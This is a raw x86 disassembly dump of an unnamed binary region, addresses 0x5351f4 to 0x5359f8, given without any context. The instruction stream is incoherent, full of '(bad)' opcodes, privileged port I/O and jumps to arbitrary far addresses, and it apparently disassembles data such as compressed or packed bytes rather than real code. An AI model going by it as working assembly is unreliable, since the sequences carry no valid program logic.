  5351f4:	dec    edx
  5351f5:	add    BYTE PTR ds:0xba27644f,cl
  5351fb:	inc    esi
  5351fc:	test   BYTE PTR [edx-0x7f324017],al
  535202:	shl    DWORD PTR [ecx+0x63],cl
  535205:	adc    edi,edi
  535207:	std    
  535208:	add    BYTE PTR [edx],bl
  53520a:	not    dl
  53520c:	pop    ss
  53520d:	es pusha 
  53520f:	mov    ch,0xfc
  535211:	add    esi,DWORD PTR [edi-0x24]
  535214:	cmp    edi,DWORD PTR [esi-0x2c]
  535217:	cmp    al,0x1e
  535219:	(bad)  
  53521a:	jbe    0x5351b6
  53521c:	fwait
  53521d:	dec    edi
  53521e:	aas    
  53521f:	stos   BYTE PTR es:[edi],al
  535220:	jnp    0x5351c1
  535222:	mov    al,0x2b
  535224:	cli    
  535225:	fmul   st(2),st
  535227:	xor    dl,BYTE PTR [edi-0x4bd1c65e]
  53522d:	jnp    0x53528e
  53522f:	imul   ebp,DWORD PTR [ebx+0x60],0x6c2cd898
  535236:	mov    DWORD PTR [ebx+eiz*2-0x54],ecx
  53523a:	push   esi
  53523b:	ficom  WORD PTR [ebp+0x13a2860b]
  535241:	sbb    cl,bh
  535243:	adc    eax,0xe81ffbfa
  535248:	dec    eax
  535249:	ror    ecx,1
  53524b:	test   eax,0x6964ba82
  535250:	and    edi,esi
  535252:	cmp    eax,0x348341a9
  535257:	dec    ebp
  535258:	call   0x44681772
  53525d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53525e:	push   0x47
  535260:	aas    
  535261:	xlat   BYTE PTR ds:[ebx]
  535262:	lock sub eax,0x52de4492
  535268:	jmp    FWORD PTR [ebx+ecx*4]
  53526b:	dec    ebx
  53526c:	js     0x535218
  53526e:	dec    eax
  53526f:	sbb    ch,BYTE PTR [esi+edx*2-0x10048aa1]
  535276:	push   edx
  535277:	in     eax,dx
  535278:	je     0x5352cf
  53527a:	popf   
  53527b:	repz ror BYTE PTR [ecx-0x3ba2e294],cl
  535282:	retf   0xff37
  535285:	mov    al,0xff
  535287:	inc    esp
  535288:	(bad)  
  535289:	adc    eax,DWORD PTR [eax+0x4b]
  53528c:	sub    edi,ebx
  53528e:	dec    ecx
  53528f:	mov    ebx,0xac7786b3
  535294:	mov    ah,bl
  535296:	mov    eax,ds:0x57d0eec0
  53529b:	dec    ecx
  53529c:	add    al,bh
  53529e:	pop    esi
  53529f:	cmp    edi,DWORD PTR [esi]
  5352a1:	sub    BYTE PTR [ecx-0x4b],0x7d
  5352a5:	cmc    
  5352a6:	cmp    edi,edx
  5352a8:	sbb    dh,BYTE PTR [eax+0x8]
  5352ab:	add    DWORD PTR [ebx-0x2cd0c65e],ebx
  5352b1:	cmp    esi,esp
  5352b3:	mov    ecx,DWORD PTR [eax+edi*1-0x122d7bfd]
  5352ba:	or     BYTE PTR [ecx+0xc],ch
  5352bd:	and    ebx,DWORD PTR [edx]
  5352bf:	(bad)  
  5352c1:	push   es
  5352c2:	shl    dl,0xfd
  5352c5:	xor    eax,0x34012f59
  5352ca:	sub    ecx,DWORD PTR [ebx]
  5352cc:	mul    BYTE PTR [edx]
  5352ce:	stc    
  5352cf:	push   cs
  5352d0:	jne    0x5352e3
  5352d2:	and    al,0x9d
  5352d4:	xor    al,0x81
  5352d6:	lock test al,0xda
  5352d9:	jl     0x535312
  5352db:	aas    
  5352dc:	adc    BYTE PTR [esi+0x22],dh
  5352df:	adc    al,BYTE PTR [eax+0x5a3f8c24]
  5352e5:	mov    BYTE PTR [edx-0x15],0x7e
  5352e9:	jl     0x5352e3
  5352eb:	jo     0x535314
  5352ed:	sub    ebp,DWORD PTR fs:[ebx-0x497c2b00]
  5352f4:	and    al,BYTE PTR [edi+0x30]
  5352f7:	pop    edi
  5352f8:	rcl    ecx,0x5c
  5352fb:	leave  
  5352fc:	push   0xffffffaf
  5352fe:	stos   DWORD PTR es:[edi],eax
  5352ff:	sbb    cl,al
  535301:	jmp    0xbc31cd70
  535306:	inc    ebp
  535307:	push   eax
  535308:	daa    
  535309:	fwait
  53530a:	leave  
  53530b:	xor    BYTE PTR [eax-0x416adf0f],cl
  535311:	pusha  
  535312:	mov    edi,0xc887781d
  535317:	sub    cl,BYTE PTR [ecx+0x58]
  53531a:	inc    ecx
  53531b:	inc    ecx
  53531c:	leave  
  53531d:	jns    0x53538a
  53531f:	mov    ah,0xc4
  535321:	sahf   
  535322:	and    al,0xe2
  535324:	(bad)  
  535325:	dec    edi
  535326:	mov    esi,0x73128d98
  53532b:	shl    DWORD PTR [ecx-0x11765c94],cl
  535331:	in     eax,0x96
  535333:	in     al,dx
  535334:	dec    esi
  535335:	xchg   ecx,eax
  535336:	loopne 0x535310
  535338:	mov    BYTE PTR [edi+0x644b4299],al
  53533e:	fst    DWORD PTR [edx+0x29f3d628]
  535344:	clc    
  535345:	lods   eax,DWORD PTR ds:[esi]
  535346:	push   ecx
  535347:	lods   al,BYTE PTR ds:[esi]
  535348:	in     al,dx
  535349:	mov    ecx,DWORD PTR [ebp+0x7473abb9]
  53534f:	sub    BYTE PTR [esp+ebx*8+0x29],ch
  535353:	adc    al,0x59
  535355:	adc    ah,BYTE PTR [edi+0x47]
  535358:	adc    edx,DWORD PTR [ebp-0x60]
  53535b:	or     eax,0x764a569
  535360:	lahf   
  535361:	and    edi,eax
  535363:	(bad)  
  535364:	das    
  535365:	and    eax,0x33c019c8
  53536a:	div    DWORD PTR ds:0xc41f9ead
  535370:	sub    eax,ebx
  535372:	(bad)  
  535374:	cdq    
  535375:	mov    ecx,0xb7df7de9
  53537a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53537b:	push   ss
  53537c:	adc    eax,0xebaa812e
  535381:	dec    esi
  535382:	mov    cl,0x4
  535384:	add    eax,0x87453d0c
  535389:	jp     0x53533f
  53538b:	xor    BYTE PTR [esi-0x1feed2d0],0xea
  535392:	(bad)  
  535393:	(bad)  
  535394:	call   0xa528:0x1fb317c8
  53539b:	adc    al,0x5b
  53539d:	int    0x7
  53539f:	imul   ebp,DWORD PTR [edi],0x3600a0c9
  5353a5:	mov    ah,0xf4
  5353a7:	sbb    DWORD PTR [edi],0x31
  5353aa:	sahf   
  5353ab:	xor    ebx,DWORD PTR [edi+0x2e]
  5353ae:	(bad)  
  5353af:	cli    
  5353b0:	pop    ss
  5353b1:	xlat   BYTE PTR ds:[ebx]
  5353b2:	jno    0x5353ab
  5353b4:	sbb    eax,0x6ab9b186
  5353b9:	xor    eax,0xfaed8822
  5353be:	push   ecx
  5353bf:	mov    ecx,0xb1cbcb59
  5353c4:	out    dx,al
  5353c5:	and    edi,ecx
  5353c7:	xchg   ebx,eax
  5353c8:	or     ecx,DWORD PTR [ebx+0x61]
  5353cb:	lods   al,BYTE PTR ds:[esi]
  5353cc:	push   cs
  5353cd:	and    cl,BYTE PTR [edx+edx*1]
  5353d0:	mov    al,0x3e
  5353d2:	sbb    eax,0x1f667a52
  5353d7:	aas    
  5353d8:	pop    ebx
  5353d9:	repnz push es
  5353db:	cld    
  5353dc:	es add al,0x50
  5353df:	into   
  5353e0:	popa   
  5353e1:	into   
  5353e2:	(bad)  
  5353e3:	rcl    DWORD PTR gs:[ebx],1
  5353e6:	cmp    al,0x74
  5353e8:	cdq    
  5353e9:	push   edi
  5353ea:	fidivr WORD PTR [esi+eax*1-0x486feb0b]
  5353f1:	jmp    0x53537c
  5353f3:	adc    ecx,0x1c23b9fb
  5353f9:	out    dx,eax
  5353fa:	add    eax,0xf0762803
  5353ff:	push   esp
  535400:	stc    
  535401:	add    cl,0x88
  535404:	add    cl,BYTE PTR [esi]
  535406:	xchg   BYTE PTR [eax-0x68f5262c],bh
  53540c:	pop    ecx
  53540d:	stc    
  53540e:	mov    al,ds:0x648c4842
  535413:	dec    ebx
  535414:	clc    
  535415:	fwait
  535416:	dec    edi
  535417:	jne    0x535478
  535419:	int    0x48
  53541b:	std    
  53541c:	(bad)  
  53541d:	test   eax,0x5138caf4
  535422:	nop
  535423:	push   edi
  535424:	jo     0x535442
  535426:	push   ecx
  535427:	inc    edx
  535428:	push   0x55929fa8
  53542d:	js     0x5353ef
  53542f:	into   
  535430:	dec    esi
  535431:	dec    edi
  535432:	or     al,0x13
  535434:	cmp    al,0x6e
  535436:	retf   
  535437:	cwde   
  535438:	pop    ebp
  535439:	or     DWORD PTR [ecx],ebp
  53543b:	popf   
  53543c:	mov    BYTE PTR [eax],0x1b
  53543f:	xchg   esp,eax
  535440:	into   
  535441:	inc    ecx
  535442:	ja     0x535415
  535444:	ret    0xfed0
  535447:	mov    esi,0x7b0300e1
  53544c:	lds    ebp,FWORD PTR [eax]
  53544e:	rcr    DWORD PTR [eax+0x585fb536],0xb1
  535455:	sbb    ebp,eax
  535457:	or     ebx,DWORD PTR [ecx]
  535459:	int    0x55
  53545b:	cmc    
  53545c:	inc    esp
  53545d:	or     DWORD PTR [ebp-0x655742eb],edi
  535463:	cmp    ebp,DWORD PTR [eax+esi*8+0x6a]
  535467:	std    
  535468:	shl    ch,cl
  53546a:	mov    ds:0xc09684e5,al
  53546f:	lods   al,BYTE PTR ds:[esi]
  535470:	pushf  
  535471:	js     0x5354d0
  535473:	add    BYTE PTR [edx],cl
  535475:	add    edx,DWORD PTR [esi+0x1b9518d3]
  53547b:	mov    ebx,0xb2095d39
  535480:	es mov cl,0x90
  535483:	pop    edx
  535484:	adc    al,0x94
  535486:	xchg   ebx,eax
  535487:	imul   esi,DWORD PTR [ecx-0x4c],0x46
  53548b:	lods   al,BYTE PTR ds:[esi]
  53548c:	push   edx
  53548d:	jge    0x5354e1
  53548f:	mov    eax,0x849c2ffd
  535494:	icebp  
  535495:	mov    dh,0x64
  535497:	jns    0x5354a9
  535499:	push   ss
  53549a:	and    cl,BYTE PTR [edx]
  53549c:	test   DWORD PTR ds:0x8b805db7,esp
  5354a2:	fistp  WORD PTR ss:[eax-0x118b0d5]
  5354a9:	inc    eax
  5354aa:	sbb    eax,0x17709845
  5354af:	test   DWORD PTR [ebp-0x4c],eax
  5354b2:	int    0x82
  5354b4:	adc    DWORD PTR [ebp-0x6d],edi
  5354b7:	pop    eax
  5354b8:	stos   BYTE PTR es:[edi],al
  5354b9:	ret    0x3325
  5354bc:	or     ah,dl
  5354be:	mov    al,0xdd
  5354c0:	sar    DWORD PTR [ebx+0x4c],cl
  5354c3:	pop    edx
  5354c4:	neg    BYTE PTR [ecx-0x1fb2bbb0]
  5354ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5354cb:	stos   BYTE PTR es:[edi],al
  5354cc:	xchg   ebx,eax
  5354cd:	and    DWORD PTR [eax+0x37],ebx
  5354d0:	sar    ecx,cl
  5354d2:	adc    BYTE PTR [eax],dl
  5354d4:	mov    DWORD PTR [edx+ecx*4],edi
  5354d7:	jns    0x5354ed
  5354d9:	add    eax,0x1cae7687
  5354de:	dec    eax
  5354df:	repz mov edi,0xae972833
  5354e5:	shl    DWORD PTR [edi-0x4875cedc],0xe8
  5354ec:	das    
  5354ed:	data16 cmp BYTE PTR [esp+edx*1],al
  5354f1:	mov    cl,0xd
  5354f3:	cmp    BYTE PTR [edx],dh
  5354f5:	nop
  5354f6:	inc    ebp
  5354f7:	outs   dx,DWORD PTR ds:[esi]
  5354f8:	call   0xddd708d5
  5354fd:	sahf   
  5354fe:	jp     0x5354b5
  535500:	push   ebp
  535501:	cmp    eax,0xdf0a94e6
  535506:	outs   dx,BYTE PTR ds:[esi]
  535507:	push   es
  535508:	or     cl,al
  53550a:	mov    bl,0xf6
  53550c:	jle    0x535563
  53550e:	imul   ebp,DWORD PTR ds:0x8e58af2f,0x42
  535515:	pop    edi
  535516:	sbb    DWORD PTR [ecx-0x69c87ece],esi
  53551c:	pop    es
  53551d:	jmp    0x9c9b068b
  535522:	dec    esp
  535523:	retf   0xbe21
  535526:	retf   0x73cb
  535529:	icebp  
  53552a:	and    DWORD PTR [ecx+0x35],ebx
  53552d:	sub    BYTE PTR [eax],ch
  53552f:	enter  0x4e1f,0x68
  535533:	jmp    0x535512
  535535:	out    0x2e,al
  535537:	stos   BYTE PTR es:[edi],al
  535538:	popa   
  535539:	clc    
  53553a:	pop    edx
  53553b:	jmp    0x535564
  53553d:	enter  0x71a5,0xc1
  535541:	stc    
  535542:	ins    BYTE PTR es:[edi],dx
  535543:	pop    es
  535544:	mov    ds:0x9d573fb9,al
  535549:	mov    ebx,0xf2c0ad48
  53554e:	test   bl,cl
  535550:	pop    ecx
  535551:	sub    dl,ch
  535553:	lock xchg esi,eax
  535555:	pop    ecx
  535556:	dec    ebp
  535557:	jnp    0x535530
  535559:	sbb    edi,edx
  53555b:	imul   ebx,DWORD PTR [eax+0x27cbc27e],0xacd36948
  535565:	aaa    
  535566:	ja     0x535509
  535568:	dec    esi
  535569:	int    0xbf
  53556b:	mov    edx,0xa17048d8
  535570:	out    0x2,eax
  535572:	inc    esi
  535573:	test   BYTE PTR [edx-0x42d07331],al
  535579:	push   0x999a1263
  53557e:	out    0xb9,eax
  535580:	mov    eax,0x8bf83b53
  535585:	inc    edx
  535586:	loop   0x53559e
  535588:	aas    
  535589:	fidivr WORD PTR [ebp+0x765835a8]
  53558f:	mov    ebx,0x563205db
  535594:	leave  
  535595:	sbb    DWORD PTR [esi-0x41],edi
  535598:	fs (bad) 
  53559a:	cmp    BYTE PTR [edi],al
  53559c:	nop
  53559d:	fild   QWORD PTR [ebp+0x25]
  5355a0:	xchg   edx,eax
  5355a1:	fstp   DWORD PTR [ebx-0x39551ff0]
  5355a7:	cmp    eax,0x92e70eb5
  5355ac:	pop    ecx
  5355ad:	sub    eax,0xc06380f2
  5355b2:	push   edx
  5355b3:	add    BYTE PTR [edi+0x5f],bl
  5355b6:	icebp  
  5355b7:	inc    edx
  5355b8:	sti    
  5355b9:	push   ebx
  5355ba:	sahf   
  5355bb:	xchg   esi,eax
  5355bc:	push   ecx
  5355bd:	aas    
  5355be:	jmp    0x5355b9
  5355c0:	out    dx,al
  5355c1:	stos   DWORD PTR es:[edi],eax
  5355c2:	xor    edi,ecx
  5355c4:	ror    esp,0x39
  5355c7:	jl     0x535608
  5355c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5355ca:	test   DWORD PTR [esi-0x7d60cb49],eax
  5355d0:	fcomp  QWORD PTR [ebx]
  5355d2:	pop    ebp
  5355d3:	cwde   
  5355d4:	mov    dh,0xe3
  5355d6:	jae    0x5355c3
  5355d8:	jge    0x535594
  5355da:	inc    ebp
  5355db:	xchg   esp,eax
  5355dc:	cld    
  5355dd:	jmp    0xf1f3:0xc2455f78
  5355e4:	cmp    eax,0x79d96e55
  5355e9:	aas    
  5355ea:	ret    
  5355eb:	int3   
  5355ec:	cld    
  5355ed:	push   ss
  5355ee:	mov    esp,0xf2162ec8
  5355f3:	loope  0x535629
  5355f5:	clc    
  5355f6:	inc    edi
  5355f7:	pop    ecx
  5355f8:	fsub   DWORD PTR [esi+edi*4-0x5f]
  5355fc:	jecxz  0x535622
  5355fe:	jae    0x535598
  535600:	lods   eax,DWORD PTR ds:[esi]
  535601:	call   0xe03de442
  535606:	inc    esp
  535607:	or     eax,0x406d26ac
  53560c:	fwait
  53560d:	(bad)  
  53560f:	outs   dx,DWORD PTR ds:[esi]
  535610:	dec    edi
  535611:	inc    edx
  535612:	mov    esp,0xeb7b08d2
  535617:	fdivr  QWORD PTR [eax-0x72]
  53561a:	(bad)  
  53561b:	adc    BYTE PTR [edi+ecx*1+0xa81889a],ah
  535622:	shl    DWORD PTR [edx+0x2d],cl
  535625:	inc    ebp
  535626:	pop    ecx
  535627:	(bad)  
  535629:	mov    ah,0x2
  53562b:	jno    0x5356ac
  53562d:	mov    bh,0xa9
  53562f:	fisub  DWORD PTR ds:0x5b94f567
  535635:	(bad)  
  535636:	xchg   edi,eax
  535637:	lock arpl WORD PTR [ecx-0x60],sp
  53563b:	(bad)  
  53563c:	xor    DWORD PTR [eax],edx
  53563e:	or     eax,0x342f9fb
  535643:	dec    esi
  535644:	fst    QWORD PTR [ebp-0x12]
  535647:	mov    dl,0x33
  535649:	mov    ebp,DWORD PTR [esi-0x71b7f714]
  53564f:	int3   
  535650:	push   ds
  535651:	sbb    ebx,DWORD PTR [edi]
  535653:	mov    ds:0xbcce1a3d,al
  535658:	mov    eax,ds:0x342f4358
  53565d:	lahf   
  53565e:	or     ch,al
  535660:	jbe    0x53562f
  535662:	jno    0x535645
  535664:	jl     0x5356ce
  535666:	maskmovq mm4,(bad)
  535667:	mul    DWORD PTR [eax-0x45]
  53566a:	leave  
  53566b:	and    BYTE PTR [ecx+0x71a7ec60],dh
  535671:	mov    ?,ebx
  535673:	push   esi
  535674:	jecxz  0x535610
  535676:	adc    bl,BYTE PTR ds:0x7f695321
  53567c:	in     al,0xb8
  53567e:	mov    ebx,0x80569803
  535683:	xor    dl,BYTE PTR cs:[edi+0x684b9300]
  53568a:	mov    edi,0xa0153375
  53568f:	add    eax,0xda7d16e8
  535694:	popf   
  535695:	inc    edi
  535696:	pop    edx
  535697:	adc    esi,ecx
  535699:	imul   esi,DWORD PTR ss:[ebp+0x39],0x71
  53569e:	xchg   esi,eax
  53569f:	pop    edi
  5356a0:	inc    ecx
  5356a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5356a2:	adc    BYTE PTR ds:0xc26d4d3b,bh
  5356a8:	cmp    eax,ecx
  5356aa:	retf   
  5356ab:	ret    0x8e7
  5356ae:	(bad)  
  5356af:	shr    BYTE PTR [edi+0x74],1
  5356b2:	sub    bh,BYTE PTR [esi]
  5356b4:	mov    edx,0xac041b0b
  5356b9:	and    dl,BYTE PTR [edx]
  5356bb:	popa   
  5356bc:	loop   0x535641
  5356be:	dec    edx
  5356bf:	dec    ebx
  5356c0:	xchg   DWORD PTR [esi+0x20],ebx
  5356c3:	and    DWORD PTR [edx-0x3b],edi
  5356c6:	cwde   
  5356c7:	xor    edx,DWORD PTR [eax+0x2f4c80a2]
  5356cd:	das    
  5356ce:	(bad)  
  5356cf:	jl     0x5356e5
  5356d1:	cdq    
  5356d2:	jge    0x53565e
  5356d4:	ins    BYTE PTR es:[edi],dx
  5356d5:	ret    0xa630
  5356d8:	out    0xbd,eax
  5356da:	sbb    ah,BYTE PTR [eax+edi*2+0x425c789c]
  5356e1:	outs   dx,BYTE PTR ds:[esi]
  5356e2:	or     eax,0x79d1fe1c
  5356e7:	test   al,0x1a
  5356e9:	callw  0x4f02
  5356ed:	gs mov eax,0xc964e275
  5356f3:	je     0x53569f
  5356f5:	rol    BYTE PTR [esi],cl
  5356f7:	cmp    eax,0xfab90647
  5356fc:	sub    edi,DWORD PTR [edx]
  5356fe:	fwait
  5356ff:	pushf  
  535700:	ins    BYTE PTR es:[edi],dx
  535701:	inc    edx
  535702:	aas    
  535703:	inc    edi
  535704:	sti    
  535705:	mov    dh,0x4e
  535707:	xchg   DWORD PTR [ecx-0x6f55c890],eax
  53570d:	sub    BYTE PTR [eax+edi*8-0x79],ah
  535711:	shl    BYTE PTR [edx-0x1c],cl
  535714:	fcomp  DWORD PTR [ecx+0x32]
  535717:	fisttp DWORD PTR [edi+eiz*8+0x4b]
  53571b:	and    BYTE PTR [ebp+0x1e9c496c],dl
  535721:	(bad)  
  535722:	out    dx,eax
  535723:	xchg   ebp,eax
  535724:	clts   
  535726:	pop    ds
  535727:	and    bh,dh
  535729:	mov    DWORD PTR ss:[ebp+0x52],eax
  53572d:	dec    ebx
  53572e:	cwde   
  53572f:	push   edi
  535730:	mov    ch,0xa9
  535732:	mov    edx,0x5b51f24a
  535737:	test   DWORD PTR [edi+0x1d],0xbbb8c597
  53573e:	sbb    DWORD PTR [esi+ebx*2],ebx
  535741:	mov    bl,0x29
  535743:	scas   al,BYTE PTR es:[edi]
  535744:	imul   ecx,DWORD PTR [ebp-0x63],0x29227643
  53574b:	push   esi
  53574c:	rol    DWORD PTR [esi-0x5b539b1f],cl
  535752:	add    eax,0x7a9515e0
  535757:	mov    edx,0x283baa54
  53575c:	cwde   
  53575d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  53575e:	mov    ds:0x98ff6a8d,eax
  535763:	sar    DWORD PTR [edx+0x2a],0x9f
  535767:	fld    QWORD PTR [ebp-0x33e4817]
  53576d:	or     BYTE PTR [ecx+eiz*4+0x5bdb17fc],bl
  535774:	ret    
  535775:	in     eax,dx
  535776:	pop    esp
  535777:	jle    0x5357e0
  535779:	pop    ecx
  53577a:	int3   
  53577b:	shl    DWORD PTR [eiz*1+0x2e0c7785],0xa3
  535783:	or     esp,DWORD PTR [ebp+0x66723bc4]
  535789:	pop    edi
  53578a:	or     cl,BYTE PTR [esi+0x22]
  53578d:	(bad)  
  53578e:	std    
  53578f:	loope  0x535790
  535791:	dec    ebp
  535792:	cs lock in ax,dx
  535796:	repnz sti 
  535798:	or     DWORD PTR [esi+0x6a],ebx
  53579b:	jns    0x535785
  53579d:	lods   al,BYTE PTR ds:[esi]
  53579e:	cmp    al,dl
  5357a0:	cdq    
  5357a1:	or     esi,edi
  5357a3:	push   eax
  5357a4:	dec    esp
  5357a5:	cmp    bl,BYTE PTR [edi-0x69977606]
  5357ab:	ins    BYTE PTR es:[edi],dx
  5357ac:	fadd   DWORD PTR [ebx-0x682288fd]
  5357b2:	dec    ebp
  5357b3:	in     al,dx
  5357b4:	fwait
  5357b5:	dec    edi
  5357b6:	adc    bl,BYTE PTR [eax+0x5f]
  5357b9:	adc    al,0x7b
  5357bb:	into   
  5357bc:	jo     0x5357ae
  5357be:	push   cs
  5357bf:	or     dl,BYTE PTR [eax+eiz*4+0x71]
  5357c3:	mov    ebp,0x61d67b98
  5357c8:	cmp    bh,bl
  5357ca:	lods   eax,DWORD PTR ds:[esi]
  5357cb:	mov    fs,esp
  5357cd:	gs cmp eax,0x24848157
  5357d3:	dec    ebp
  5357d4:	cmovno ebp,eax
  5357d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5357d8:	mov    bl,0xff
  5357da:	mov    BYTE PTR [eax],0xd6
  5357dd:	ins    BYTE PTR es:[edi],dx
  5357de:	jge    0x535845
  5357e0:	jns    0x53578e
  5357e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5357e3:	mov    WORD PTR [esi+0x1479eefb],cs
  5357e9:	fs pop edi
  5357eb:	sub    BYTE PTR [esi+0x6966481b],0x8a
  5357f2:	adc    ebp,0x30b24e67
  5357f8:	cmp    al,0x4d
  5357fa:	jo     0x53582c
  5357fc:	xchg   DWORD PTR [esp-0x6ea2e4f3],ecx
  535803:	ss add ebx,esi
  535806:	jecxz  0x53584a
  535808:	jmp    0xc93c:0x518e0a6c
  53580f:	pop    ss
  535810:	out    dx,al
  535811:	cdq    
  535812:	pop    esi
  535813:	and    al,0x79
  535815:	leave  
  535816:	inc    edi
  535817:	jno    0x5357df
  535819:	mov    bl,0x90
  53581b:	xor    BYTE PTR [esi],bl
  53581d:	inc    edx
  53581e:	cmp    eax,0x4680adb3
  535823:	dec    ebx
  535824:	or     dl,al
  535826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  535827:	aas    
  535828:	sbb    ah,BYTE PTR [ebp-0x3765fb91]
  53582e:	or     BYTE PTR [edi-0x552286cd],bl
  535834:	icebp  
  535835:	lds    edi,FWORD PTR [edx]
  535837:	jae    0x535813
  535839:	jns    0x5358ab
  53583b:	loop   0x535827
  53583d:	push   ebp
  53583e:	push   esp
  53583f:	sub    esp,ecx
  535841:	add    al,0x33
  535843:	jb     0x535873
  535845:	sahf   
  535846:	pop    ecx
  535847:	inc    edi
  535848:	ins    DWORD PTR es:[edi],dx
  535849:	xchg   edi,eax
  53584a:	pop    es
  53584b:	add    dh,dl
  53584d:	in     eax,0x86
  53584f:	jns    0x535844
  535851:	not    DWORD PTR [ebx-0x7176b5e6]
  535857:	fldenv [ebx]
  535859:	aam    0x66
  53585b:	cs mov eax,0xcd2eb0bd
  535861:	bound  ebp,QWORD PTR [ecx+esi*8+0x7cff6a10]
  535868:	push   cs
  535869:	bound  esp,QWORD PTR [ecx+0x6f]
  53586c:	outs   dx,BYTE PTR ds:[esi]
  53586d:	inc    edi
  53586e:	sub    al,bh
  535870:	fsubr  DWORD PTR [ebp-0x62e26d3d]
  535876:	xchg   esi,eax
  535877:	cmp    eax,0x5e73446e
  53587c:	xchg   esi,eax
  53587d:	and    ecx,DWORD PTR [ecx]
  53587f:	gs ret 0x9741
  535883:	lea    esi,[ebp-0x53]
  535886:	mov    ebp,0x17ce0120
  53588b:	inc    edi
  53588c:	mov    ah,0x68
  53588e:	add    esi,ecx
  535890:	push   esp
  535891:	push   ebp
  535892:	xchg   DWORD PTR [edi-0x7b084c9d],edx
  535898:	add    ebx,eax
  53589a:	nop
  53589b:	push   ds
  53589c:	pop    ds
  53589d:	xchg   ebx,eax
  53589e:	(bad)  
  53589f:	aam    0x9
  5358a1:	cmp    eax,0xb7148d34
  5358a6:	adc    cl,BYTE PTR [edi]
  5358a8:	(bad)  
  5358a9:	jmp    0x892ff7b5
  5358ae:	inc    ecx
  5358af:	lea    ecx,[ebx+0x67]
  5358b2:	jnp    0x5358cf
  5358b4:	dec    esp
  5358b5:	ss aam 0x7a
  5358b8:	iret   
  5358b9:	enter  0xc27e,0xdc
  5358bd:	cs in  eax,dx
  5358bf:	(bad)  
  5358c0:	jp     0x5358eb
  5358c2:	mov    ss,WORD PTR [esp+eiz*4]
  5358c5:	popf   
  5358c6:	test   DWORD PTR [esi+edx*2-0x22],0x36a68080
  5358ce:	adc    bl,BYTE PTR [edx-0x30c02368]
  5358d4:	pop    ecx
  5358d5:	jl     0x5358ab
  5358d7:	xchg   ecx,eax
  5358d8:	sahf   
  5358d9:	outs   dx,BYTE PTR ds:[esi]
  5358da:	xor    ch,BYTE PTR [ebp+0x75]
  5358dd:	or     dh,ch
  5358df:	out    dx,eax
  5358e0:	aaa    
  5358e1:	(bad)  
  5358e2:	mov    edx,0xc71e4267
  5358e7:	sub    esp,DWORD PTR [edi+eiz*8-0x49310b8a]
  5358ee:	sub    BYTE PTR [edi+ebp*8],ch
  5358f1:	iret   
  5358f2:	loope  0x535883
  5358f4:	xchg   ecx,eax
  5358f5:	outs   dx,DWORD PTR ds:[esi]
  5358f6:	mov    bh,BYTE PTR [edi-0x8]
  5358f9:	dec    esi
  5358fa:	or     DWORD PTR [ebp+0x3cc8ddd9],esp
  535900:	mov    esi,0xf5a9ce31
  535905:	mov    ebx,0x2ed41bda
  53590a:	fldcw  WORD PTR [ecx+0x5]
  53590d:	aam    0x50
  53590f:	(bad)
  535912:	repz mov al,0x61
  535915:	sar    cl,1
  535917:	xor    al,bh
  535919:	popa   
  53591a:	in     eax,0xeb
  53591c:	rcr    BYTE PTR [edx-0x36d755c8],1
  535922:	fild   QWORD PTR [eax-0x6966e926]
  535928:	push   ss
  535929:	jmp    0x2a06:0x5469025b
  535930:	add    bl,BYTE PTR ds:0x9315b6c3
  535936:	mov    dl,0x4f
  535938:	int3   
  535939:	cmovns ebp,DWORD PTR [eax-0x60]
  53593d:	mov    ch,0xd8
  53593f:	adc    esp,0x4287c61b
  535945:	inc    esi
  535946:	and    DWORD PTR [ebp+0x1b434117],0xffffffef
  53594d:	out    0xe2,al
  53594f:	dec    esp
  535950:	pop    edi
  535951:	out    dx,al
  535952:	add    BYTE PTR ds:[ecx+0xa],dh
  535956:	in     al,dx
  535957:	add    al,0x32
  535959:	loop   0x5359a5
  53595b:	add    DWORD PTR [ecx+0x796c10d5],edi
  535961:	inc    edx
  535962:	call   0xe750:0x3c1295b4
  535969:	add    BYTE PTR [ecx],ah
  53596b:	(bad)
  53596e:	sbb    BYTE PTR [ecx-0x51ef9927],cl
  535974:	pop    edi
  535975:	push   ebp
  535976:	sahf   
  535977:	mov    ebp,0xac93c77b
  53597c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  53597d:	adc    eax,0xe4122f81
  535982:	adc    al,0x9
  535984:	in     eax,dx
  535985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  535986:	mov    edx,0x8653d7f
  53598b:	ins    BYTE PTR es:[edi],dx
  53598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  53598d:	div    DWORD PTR [edx]
  53598f:	inc    esi
  535990:	xchg   ebp,eax
  535991:	repnz les esp,FWORD PTR [esi]
  535994:	mov    cl,0xc0
  535996:	xchg   esp,eax
  535997:	addr16 jns 0x5359e3
  53599a:	stc    
  53599b:	adc    eax,0xe26a15f
  5359a0:	dec    BYTE PTR [eax-0x7e]
  5359a3:	call   0xa8e9:0xed0779fd
  5359aa:	lods   al,BYTE PTR ds:[esi]
  5359ab:	sbb    BYTE PTR [ecx-0x6],bl
  5359ae:	je     0x535968
  5359b0:	jno    0xe3b61c71
  5359b6:	retf   0x647d
  5359b9:	into   
  5359ba:	icebp  
  5359bb:	stos   BYTE PTR es:[edi],al
  5359bc:	leave  
  5359bd:	loopne 0x5359fd
  5359bf:	pop    es
  5359c0:	retf   0x6682
  5359c3:	mov    DWORD PTR [esi+ebx*8+0x65],0x6d2cd660
  5359cb:	dec    esp
  5359cc:	sbb    BYTE PTR [ecx-0x79b187e4],0x12
  5359d3:	and    bh,BYTE PTR [esi-0x74]
  5359d6:	sar    BYTE PTR [ebp+0x1eb99f3d],cl
  5359dc:	add    al,BYTE PTR [esi+0x4a8a8655]
  5359e2:	lock xchg esi,eax
  5359e4:	retf   0x136a
  5359e7:	dec    esp
  5359e8:	adc    ah,BYTE PTR [ebp-0x135ddfd9]
  5359ee:	mov    al,ds:0x50240214
  5359f3:	or     dh,BYTE PTR [edi-0x30]
  5359f6:	adc    cl,bh
  5359f8:	jne    0x5359b3
